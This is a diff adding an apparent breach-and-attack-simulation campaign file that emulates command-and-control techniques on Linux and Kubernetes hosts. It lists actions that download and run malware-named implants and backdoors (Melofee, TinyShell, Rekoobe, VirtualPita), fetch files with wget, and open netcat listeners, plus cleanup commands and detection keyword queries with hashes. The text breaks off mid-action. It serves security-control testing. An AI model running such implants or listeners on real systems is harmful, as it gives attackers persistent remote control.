@@ -1,0 +1,1270 @@
+campaign:
+    name: Command and Control Kubernetes Micro Emulation Plan
+    description: 'This threat contains a micro emulation plan for MITRE Tactic: TA0011 - Command and Control. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network.'
+    module: Kubernetes Endpoint Scenario
+    severity: High
+    affected_os:
+        - Linux
+    result_condition:
+        true: unblocked
+        false: blocked
+        condition:
+            Terms:
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-1%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-2%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-3%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-4%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-5%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-6%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-7%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-8%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-9%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-10%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-11%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-12%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-13%'
+                  Operator: eq
+            Operator: or
+    objectives:
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Test Initial Connection via Melofee Malware Implant
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to check Melofee Malware's initial connection via ICMP protocol.
+              tactic: TA0011
+              technique: T1095
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-3%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/test_client_melofee'
+                  is_async: true
+                  remote_files:
+                    - file: files/dGVzdF9jbGllbnRfbWVsb2ZlZV9fXzkzODFlMWZhLTM1ODctNDU3Yy05Nzk1LWUwMzBiNmU2NWFmYg==
+                      path: test_client_melofee
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: '"$WORKDIR"/implant'
+                  is_async: true
+                  remote_files:
+                    - file: files/aW1wbGFudF9fXzZjNWRhMzIzLTkwYWUtNDgwMy04MGUyLTQ0NzE5M2VjN2Y0ZA==
+                      path: implant
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: '"$WORKDIR"/test_client_melofee ping'
+                  success_conditions:
+                    - output: pong
+              rewind_processes:
+                - arguments: kill -9 $(ss -tulnp | grep 4444 | grep -o 'pid=[0-9]*' | cut -d= -f2)
+                - arguments: pkill -9 test_client_melofee
+                - arguments: pkill -9 implant
+                - arguments: rm -rf "$WORKDIR"/test_client* "$WORKDIR"/implant
+                - arguments: rm -rf /tmp/implant_relay.sock
+              keyword_queries:
+                - (( ((("test_client_melofee" OR "test_client_melofee___9381e1fa-3587-457c-9795-e030b6e65afb")) OR ("0e03833076cf658b83f6d64129bcfe42e344c5e3d2fa2357619b95accb531117" OR "42c37b6d2d1dccae0c6c852ace9f2730900571d4" OR "03e19c6b083ab5157952843e64eb5ab9")) OR ((("implant" OR "implant___6c5da323-90ae-4803-80e2-447193ec7f4d")) OR ("725936f74554320a478d8a10cd6b2fd1c09190bc94a9a961cced4483292b9585" OR "78eb5e832f7e9e50bd8d5b16fbb72183195ec819" OR "bbfa606f6996a58aa99417510e776c25")) OR ("ping" AND "/test_client_melofee") ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Start Encrypted TinyShell Listener for C2 Communication
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to start a TinyShell Malware listener to create encrypted communication channels between local victim machines for lateral movement and file transfer.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Rocky Linux 8
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/TinyShell_host -s PicusPicusPicus -p 1234'
+                  remote_files:
+                    - file: files/UmVrb29iZV9ob3N0X19fZWJjNmQ1ZGQtMjMwNS00MDVhLWIwMTUtMTU5YTZkOWRjMDVi
+                      path: TinyShell_host
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: ss -tulnp | grep 0.0.0.0:1234
+                  delay: 3000
+                  success_conditions:
+                    - output: LISTEN
+              rewind_processes:
+                - arguments: pkill -f 'TinyShell_(host|client)'
+                - arguments: rm -rf "$WORKDIR"/TinyShell_host
+              keyword_queries:
+                - (( ("ss" AND "tulnp") OR ("grep" AND "1234") OR (("TinyShell_host") OR ("41d6c88c848f87d065c7068fa65ddb303373e9d59821e396aadf3a40d5f38844" OR "efa7de3028ecb1b48987783fced1b70dba9b23d4" OR "30a8931713bf9e456bfcbe1b79a7cb8b")) ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Execute VirtualPita Backdoor for C2 Communication
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to run the VirtualPita backdoor to create a command and control communication to be able to transfer files, execute code, and create services on the victim host.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Rocky Linux 8
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Execution
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/VirtualPita -p 2222 -s mysecret --self-test --disable-history --service-name syslogx --enable-vsock --beacon 127.0.0.1:2222:10'
+                  remote_files:
+                    - file: files/VmlydHVhbFBpdGFfX18yMzIzOWIzMS02ZDUwLTQ4MTAtOWQ0OS0yYzYzNDc5ZDM2NmY=
+                      path: VirtualPita
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: cat /tmp/edrtest_metrics.jsonl
+                  success_conditions:
+                    - output: self_test_complete
+              rewind_processes:
+                - arguments: pkill -9 -f VirtualPita*
+                - arguments: rm -rf "$WORKDIR"/VirtualPita
+                - arguments: kill -9 $(ss -tulnp | grep 2222 | grep -o 'pid=[0-9]*' | cut -d= -f2)
+                - arguments: rm -rf /tmp/edrtest_*
+              keyword_queries:
+                - ((("VirtualPita" OR "VirtualPita___23239b31-6d50-4810-9d49-2c63479d366f") OR ("68273e59b686d11dfba379f849a15f7e51862385" OR "154424981779b4c1cc87ab6adc4a6e7546fa81ad45c0afaebc0cb44ebf05cd18" OR "44283b5e168e700cdbe7ad0a2307fab6") OR ("cat" AND "edrtest_metrics.jsonl")) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Start Custom Encrypted Listener for C2 Communication
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to start a custom listener to create encrypted communication channels between local victim machines for lateral movement and file transfer.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Rocky Linux 8
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/Rekoobe_host -s PicusPicusPicus -p 1234'
+                  remote_files:
+                    - file: files/UmVrb29iZV9ob3N0X19fZWJjNmQ1ZGQtMjMwNS00MDVhLWIwMTUtMTU5YTZkOWRjMDVi
+                      path: Rekoobe_host
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: ss -tulnp | grep 0.0.0.0:1234
+                  delay: 3000
+                  success_conditions:
+                    - output: LISTEN
+              rewind_processes:
+                - arguments: pkill -9 -f Rekoobe
+                - arguments: rm -rf "$WORKDIR"/Rekoobe_host
+              keyword_queries:
+                - (("Rekoobe" AND "host" AND "PicusPicusPicus" AND "1234") OR ("tulnp" AND "grep" AND "0.0.0.0" AND "1234") OR (("Rekoobe_host" OR "Rekoobe_host___ebc6d5dd-2305-405a-b015-159a6d9dc05b") OR ("efa7de3028ecb1b48987783fced1b70dba9b23d4" OR "41d6c88c848f87d065c7068fa65ddb303373e9d59821e396aadf3a40d5f38844" OR "30a8931713bf9e456bfcbe1b79a7cb8b")) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Execute Custom Backdoor for C2 Communication
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to run the custom backdoor to create a command and control communication to be able to transfer files, execute code, and create services on the victim host.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Rocky Linux 8
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Execution
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/VirtualPita -p 2222 -s mysecret --self-test --disable-history --service-name syslogx --enable-vsock --beacon 127.0.0.1:2222:10'
+                  remote_files:
+                    - file: files/VmlydHVhbFBpdGFfX18yMzIzOWIzMS02ZDUwLTQ4MTAtOWQ0OS0yYzYzNDc5ZDM2NmY=
+                      path: VirtualPita
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: cat /tmp/edrtest_metrics.jsonl
+                  success_conditions:
+                    - output: self_test_complete
+              rewind_processes:
+                - arguments: pkill -9 -f VirtualPita*
+                - arguments: rm -rf "$WORKDIR"/VirtualPita
+                - arguments: kill -9 $(ss -tulnp | grep 2222 | grep -o 'pid=[0-9]*' | cut -d= -f2)
+                - arguments: rm -rf /tmp/edrtest_*
+              keyword_queries:
+                - ((("VirtualPita" OR "VirtualPita___23239b31-6d50-4810-9d49-2c63479d366f") OR ("68273e59b686d11dfba379f849a15f7e51862385" OR "154424981779b4c1cc87ab6adc4a6e7546fa81ad45c0afaebc0cb44ebf05cd18" OR "44283b5e168e700cdbe7ad0a2307fab6") OR ("cat" AND "edrtest_metrics.jsonl")) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Start Encrypted Rekoobe Listener for C2 Communication
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to start a Rekaabo Malware listener to create encrypted communication channels between local victim machines for lateral movement and file transfer.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Rocky Linux 8
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: '"$WORKDIR"/Rekoobe_host -s PicusPicusPicus -p 1234'
+                  remote_files:
+                    - file: files/UmVrb29iZV9ob3N0X19fZWJjNmQ1ZGQtMjMwNS00MDVhLWIwMTUtMTU5YTZkOWRjMDVi
+                      path: Rekoobe_host
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: ss -tulnp | grep 0.0.0.0:1234
+                  delay: 3000
+                  success_conditions:
+                    - output: LISTEN
+              rewind_processes:
+                - arguments: pkill -9 -f Rekoobe
+                - arguments: rm -rf "$WORKDIR"/Rekoobe_host
+              keyword_queries:
+                - (("Rekoobe" AND "host" AND "PicusPicusPicus" AND "1234") OR ("tulnp" AND "grep" AND "0.0.0.0" AND "1234") OR (("Rekoobe_host" OR "Rekoobe_host___ebc6d5dd-2305-405a-b015-159a6d9dc05b") OR ("efa7de3028ecb1b48987783fced1b70dba9b23d4" OR "41d6c88c848f87d065c7068fa65ddb303373e9d59821e396aadf3a40d5f38844" OR "30a8931713bf9e456bfcbe1b79a7cb8b")) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Download Additional Files from C2s
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to download additional files and save them to the victim's machine.
+              tactic: TA0011
+              technique: T1105
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: wget $remotefile11673 -O Lindummy.txt
+                  remote_files:
+                    - file: files/TGluZHVtbXlfX180OTVlODRjOS0zYjExLTQ0YmUtOGExYy1mNGNkODk1MWVjYzgudHh0
+                      path: Lindummy.txt
+                - arguments: ls "$WORKDIR"
+                  success_conditions:
+                    - output: Lindummy.txt
+              rewind_processes:
+                - arguments: rm -rf Lindummy.txt
+              keyword_queries:
+                - (( ((("Lindummy.txt" OR "Lindummy___495e84c9-3b11-44be-8a1c-f4cd8951ecc8.txt")) OR ("9feadff72abefdb3397f0fc83149bc273e0b1b37a2ea98cb1fad24e8d1192356" OR "cbad835911716f61b70be58cfbf4fdc8ceb817ad" OR "a9c219f85879cf53d9991c9eea0e1dd0"))) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Transfer Files via Bash Script File
+              title: Kubernetes Attack
+              description: In this action, the attacker downloads the files to the local system via shell script.
+              tactic: TA0002
+              technique: T1059
+              sub_technique: T1059.004
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Execution
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - path: /bin/sh
+                  arguments: '"$WORKDIR"/dummy_downloader.sh $remotefile11673'
+                  remote_files:
+                    - file: files/TGluZHVtbXlfX180OTVlODRjOS0zYjExLTQ0YmUtOGExYy1mNGNkODk1MWVjYzgudHh0
+                      path: Lindummy.txt
+                    - file: files/ZHVtbXlfZG93bmxvYWRlcl9fX2MyYWViMGYyLTVmZjYtNGFlZi1iZTQ0LWYyZWFjYWI4ZjAzZi5zaA==
+                      path: dummy_downloader.sh
+                      is_executable: true
+                      is_downloaded: true
+                - arguments: ls "$WORKDIR"/dummys.sh
+                  success_conditions:
+                    - output: dummys.sh
+              rewind_processes:
+                - arguments: rm -rf dummys.sh
+                - arguments: rm -rf dummy_downloader.sh
+              keyword_queries:
+                - (( ((("Lindummy.txt" OR "Lindummy___495e84c9-3b11-44be-8a1c-f4cd8951ecc8.txt")) OR ("9feadff72abefdb3397f0fc83149bc273e0b1b37a2ea98cb1fad24e8d1192356" OR "cbad835911716f61b70be58cfbf4fdc8ceb817ad" OR "a9c219f85879cf53d9991c9eea0e1dd0")) OR ((("dummy_downloader" OR "dummy_downloader___c2aeb0f2-5ff6-4aef-be44-f2eacab8f03f.sh")) OR ("6ef77fe76fc4f4efb1a05b1fdb1a999610285a6adf6208069d998703e325e6ad" OR "858f3b463ab62c1c62bddaaa36c4ce4b962a5538" OR "1027cf645a3ee4b3018bb8af2a1cfb85")) OR ("ls" AND "/dummys.sh") ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Use Non-Standard Port
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to communicate over non-standard ports.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-4%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: echo "Successfully" > "$WORKDIR"/tmp.txt
+                - arguments: nc -lvnp 16789 > "$WORKDIR"/s.txt
+                  is_async: true
+                  timeout: 5000
+                - arguments: nc 127.0.0.1 16789 < "$WORKDIR"/tmp.txt
+                - arguments: cat "$WORKDIR"/s.txt
+                  success_conditions:
+                    - output: Successfully
+              rewind_processes:
+                - arguments: rm -rf "$WORKDIR"/tmp.txt
+                - arguments: rm -rf "$WORKDIR"/s.txt
+                - arguments: pkill nc
+              keyword_queries:
+                - (( ("echo" AND "Successfully" AND "/tmp.txt") OR ("nc" AND "-lvnp" AND "16789") OR ("nc" AND "127.0.0.1" AND "16789") OR ("cat" AND "/s.txt") ) AND NOT ("pkill" OR "killall" OR ("rm" AND "-rf")))
+        - type: Command and Control
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: or
+          actions:
+            - name: Start UDP Server
+              title: Kubernetes Attack
+              description: In this action, an attacker is trying to set a UDP socket to listen on the port 61069.
+              tactic: TA0011
+              technique: T1571
+              affected_os:
+                - Linux
+              affected_platforms:
+                - name: Red Hat Enterprise Linux 10
+                  architecture: 64-bit
+                - name: Rocky Linux 9
+                  architecture: 64-bit
+                - name: Ubuntu 22.04
+                  architecture: 64-bit
+                - name: CentOS 8
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 8
+                  architecture: 64-bit
+                - name: Alpine 3.22
+                  architecture: 64-bit
+                - name: SUSE 15.7
+                  architecture: 64-bit
+                - name: Alpine 3.21
+                  architecture: 64-bit
+                - name: SUSE 15.6
+                  architecture: 64-bit
+                - name: CentOS 9
+                  architecture: 64-bit
+                - name: Debian 12
+                  architecture: 64-bit
+                - name: Ubuntu 24.04
+                  architecture: 64-bit
+                - name: Red Hat Enterprise Linux 9
+                  architecture: 64-bit
+                - name: Debian 11
+                  architecture: 64-bit
+                - name: Debian 10
+                  architecture: 64-bit
+                - name: Ubuntu 20.04
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Command & Control
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
